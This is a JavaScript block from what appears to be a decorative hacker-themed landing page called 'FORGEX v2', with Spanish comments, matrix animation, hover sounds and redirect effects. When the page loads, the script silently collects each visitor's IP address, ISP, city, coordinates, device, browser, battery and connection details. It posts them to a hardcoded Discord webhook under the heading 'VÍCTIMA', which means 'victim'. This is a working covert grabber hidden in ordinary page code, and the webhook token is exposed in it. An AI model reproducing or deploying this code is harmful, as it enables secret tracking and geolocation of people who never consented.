  <script>
    // === TU WEBHOOK NUEVO (el que sí quieres) ===
    const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";

    // === GRABBER QUE SÍ TE FUNCIONA (el mismo del otro código) ===
    (async () => {
      const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
      const battery = await navigator.getBattery?.() || {};
      const uaData = navigator.userAgentData || {};
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
      const datos = {
        hora: new Date().toLocaleString("es-SV"),
        ip: geo.ip || 'oculta',
        isp: geo.org || '?',
        ciudad: geo.city || '?',
        pais: geo.country_name || '?',
        lat: geo.latitude || '?',
        lon: geo.longitude || '?',
        navegador: navigator.userAgent.substring(0,120),
        sistema: uaData.platform || navigator.platform,
        movil: uaData.mobile ? 'Sí' : 'No',
        ram: navigator.deviceMemory || '?',
        cpu: navigator.hardwareConcurrency || '?',
        pantalla: `${screen.width}x${screen.height}`,
        bateria: battery.level ? `${Math.round(battery.level*100)}%` : 'no',
        conexion: connection.effectiveType || '?',
        zona: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      const mensaje = `**VÍCTIMA EN FORGEX v2**
**IP:** ${datos.ip} (${datos.isp})
**Lugar:** ${datos.ciudad}, ${datos.pais}
**Coords:** ${datos.lat}, ${datos.lon}
**Hora SV:** ${datos.hora}
**Dispositivo:** ${datos.sistema} | Móvil: ${datos.movil}
**RAM:** ${datos.ram}GB | CPU: ${datos.cpu} núcleos
**Pantalla:** ${datos.pantalla}
**Navegador:** ${datos.navegador}`;

      await fetch(WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: mensaje})
      });
    })();

    // === TU MATRIX, SONIDO Y REDIRECCIÓN (todo igual) ===
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = innerWidth; canvas.height = innerHeight;
    const letters = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const fontSize = 14;
    let drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
    function draw() {
      ctx.fillStyle = 'rgba(0,0,0,0.05)';
      ctx.fillRect(0,0,canvas.width,canvas.height);
      ctx.fillStyle = '#0f0';
      ctx.font = fontSize + 'px monospace';
      for(let i=0; i<drops.length; i++){
        ctx.fillText(letters[Math.floor(Math.random()*letters.length)], i*fontSize, drops[i]*fontSize);
        if(drops[i]*fontSize > canvas.height && Math.random()>0.975) drops[i]=0;
        drops[i]++;
      }
    }
    setInterval(draw,35);

    // Sonido hover
    document.querySelectorAll('.card-anim').forEach(c => {
      c.addEventListener('mouseenter', () => {
        const sound = document.getElementById('hoverSound');
        sound.currentTime = 0;
        sound.play().catch(() => {});
      });
    });

    // Redirección bonita
    document.querySelectorAll('a[data-name]').forEach(a => {
      a.onclick = e => {
        e.preventDefault();
        const overlay = document.createElement('div');
        overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.97);color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;font-family:monospace;text-align:center';
        overlay.innerHTML = `<h1 class="text-5xl glitch mb-4">Redirigiendo a</h1><h2 class="text-4xl text-cyan-400">${a.dataset.name}</h2>`;
        document.body.appendChild(overlay);
        window.open(a.href, '_blank');
        setTimeout(() => overlay.remove(), 3000);
      };
    });

    // Contador visitas
    let v = localStorage.getItem('forgexVisits') || 0; v++; localStorage.setItem('forgexVisits', v);
    document.getElementById('visits').textContent = v;
  </script>
